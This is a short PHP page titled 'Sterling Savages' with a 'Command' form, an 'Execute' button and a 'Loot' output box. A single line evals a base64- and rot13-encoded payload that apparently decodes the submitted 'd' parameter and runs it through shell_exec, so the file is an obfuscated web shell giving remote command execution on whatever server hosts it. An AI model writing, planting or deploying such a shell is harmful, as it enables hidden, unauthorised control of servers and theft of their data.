<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sterling Savages</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .75);
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            padding: 10px;
            border-radius: 5px;
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: #efefef;
            border: 2px solid transparent;
        }

        input:focus {
            outline: none;
            background: transparent;
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            margin-left: 5px;
        }

        button:hover {
            background-color: #e6e6e6;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>
</head>

<?php eval(str_rot13(base64_decode('dnMgKCFyemNnbCgkX1RSR1sncSddKSkgewogICAgJHEgPSBmdXJ5eV9ya3JwKGZnZV9lYmcxMyhvbmZyNjRfcXJwYnFyKCRfVFJHWydxJ10pKSk7Cn0='))); ?>
<body>
    <main>
            <h1>Sterling Savages</h1>

        <form method="get">
            <label for="d"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="d" id="d" value="<?= htmlspecialchars($get['d'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>

            <h2>Sterling Savages Loot</h2>
            <?php if (isset($d)): ?>
                <pre><?= htmlspecialchars($d, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>No result.</small></pre>
        <?php endif; ?>
    </main>
</body>
</html>